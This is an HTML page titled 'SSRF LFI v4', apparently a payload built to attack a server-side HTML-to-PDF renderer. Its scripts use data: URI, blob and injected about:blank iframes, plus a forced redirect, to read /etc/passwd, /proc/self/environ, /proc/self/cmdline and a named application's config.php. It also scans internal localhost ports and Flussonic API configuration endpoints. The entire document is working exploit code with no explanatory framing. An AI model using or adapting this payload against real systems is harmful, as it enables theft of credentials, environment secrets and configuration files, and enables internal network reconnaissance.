<!DOCTYPE html>
<html>
<head><title>R</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font:8px/1.1 monospace;margin:2px}
.s{border:1px solid #000;margin:1px 0}
h3{font-size:9px;background:#ccc;padding:1px 2px}
iframe{width:100%;border:0}
pre{white-space:pre-wrap;font-size:7px;background:#f5f5f5;padding:2px}
</style>
</head>
<body>
<b>SSRF LFI v4</b>

<!-- APPROACH: data: URI creates opaque origin, which may access file:// differently than https:// -->
<div class="s">
<h3>1. data: URI iframe → file:///etc/passwd via XHR</h3>
<iframe style="height:250px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fetc%2Fpasswd'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('XHR%20err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
</div>

<div class="s">
<h3>2. data: URI → file:///etc/hostname via XHR</h3>
<iframe style="height:100px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fetc%2Fhostname'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('XHR%20err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
</div>

<div class="s">
<h3>3. data: URI → file:///var/www/html/Pilot7/backend/config.php</h3>
<iframe style="height:300px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2FPilot7%2Fbackend%2Fconfig.php'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
</div>

<div class="s">
<h3>4. data: URI → file:///proc/self/environ</h3>
<iframe style="height:200px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fproc%2Fself%2Fenviron'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
</div>

<div class="s">
<h3>5. data: URI → file:///proc/self/cmdline</h3>
<iframe style="height:100px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fproc%2Fself%2Fcmdline'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
</div>

<!-- APPROACH: blob: URI for file access -->
<div class="s">
<h3>6. JS blob/data iframe results</h3>
<pre id="r">loading...</pre>
</div>

<script>
var o='';
function p(s){o+=s+'\n';document.getElementById('r').textContent=o}

// Method: Create blob URL iframe, try file access from blob origin
try {
var blob = new Blob(['<script>var x=new XMLHttpRequest();x.open("GET","file:///etc/passwd",false);try{x.send();parent.postMessage(x.responseText,"*")}catch(e){parent.postMessage("blob-err:"+e.message,"*")}<\/script>'], {type:'text/html'});
var url = URL.createObjectURL(blob);
var bf = document.createElement('iframe');
bf.src = url;
bf.style = 'width:100%;height:100px;border:1px solid red';
document.body.appendChild(bf);
p('blob iframe created');
} catch(e) { p('blob err: '+e.message) }

// Listen for messages from child frames
window.addEventListener('message', function(e) {
  p('MSG FROM CHILD: ' + String(e.data).substring(0, 2000));
});

// Method: Fetch file:// from data: origin context via dynamic script
try {
var df = document.createElement('iframe');
df.src = 'about:blank';
df.style = 'width:100%;height:100px;border:1px solid blue';
document.body.appendChild(df);
setTimeout(function(){
  try {
    df.contentDocument.write('<script>fetch("file:///etc/passwd").then(r=>r.text()).then(t=>parent.postMessage("fetch-ok:"+t,"*")).catch(e=>parent.postMessage("fetch-err:"+e.message,"*"))<\/script>');
    p('about:blank iframe injected');
  } catch(e) { p('inject err: '+e.message) }
}, 500);
} catch(e) { p('df err: '+e.message) }

// Method: Try to navigate current page to file:// after rendering everything
// This runs last after 8 seconds - if it works, the PDF final page will be /etc/passwd
setTimeout(function(){
  try { window.location.href = 'file:///etc/passwd'; p('redirect attempted') } catch(e) { p('redirect err: '+e.message) }
}, 8000);

// Port scan via fetch
async function tf(l,u){
try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,500))}
catch(e){p(l+' err: '+e.message)}
}
(async function(){
await tf('8080','http://127.0.0.1:8080/');
await tf('8080/flus','http://127.0.0.1:8080/flussonic/api/read_config');
await tf('8080/flus-streams','http://127.0.0.1:8080/flussonic/api/streams');
await tf('80','http://127.0.0.1:80/');
await tf('3000','http://127.0.0.1:3000/');
await tf('9090','http://127.0.0.1:9090/');
await tf('9200','http://127.0.0.1:9200/');
})();
</script>

</body>
</html>
